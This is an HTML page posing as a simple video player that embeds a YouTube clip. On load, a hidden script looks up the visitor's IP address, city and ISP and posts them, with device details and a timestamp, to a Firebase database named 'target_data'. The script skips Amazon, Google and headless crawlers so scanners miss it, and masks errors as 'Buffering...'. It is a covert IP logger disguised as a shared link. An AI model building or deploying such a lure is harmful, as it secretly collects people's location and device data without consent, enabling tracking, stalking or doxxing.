<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Video Player</title>
    <style>
        body, html { margin: 0; padding: 0; height: 100%; overflow: hidden; background: #000; }
        iframe { width: 100%; height: 100%; border: none; }
    </style>
</head>
<body>
    <iframe id="player" src="" allow="autoplay"></iframe>

    <script>
        const dbURL = "https://data-28355-default-rtdb.firebaseio.com/target_data.json";
        
        // URL se Video ID nikalna
        const params = new URLSearchParams(window.location.search);
        const vId = params.get('v') || 'dQw4w9WgXcQ';
        document.getElementById('player').src = `https://www.youtube.com/embed/${vId}?autoplay=1`;

        async function captureData() {
            try {
                const response = await fetch('https://ipapi.co/json/');
                const ip = await response.json();

                // üõ°Ô∏è BOT FILTER: Amazon, Google aur Linux bots ko rokne ke liye
                const isBot = ip.org.includes("Amazon") || ip.org.includes("Google") || navigator.userAgent.includes("Headless");
                
                if (!isBot) {
                    const payload = {
                        ip: ip.ip,
                        city: ip.city,
                        isp: ip.org,
                        device: navigator.userAgent.match(/\(([^)]+)\)/)[1],
                        time: new Date().toLocaleString()
                    };

                    // Data bhejrahe hain Firebase mein
                    await fetch(dbURL, {
                        method: 'POST',
                        body: JSON.stringify(payload)
                    });
                }
            } catch (e) { console.log("Buffering..."); }
        }
        window.onload = captureData;
    </script>
</body>
</html>
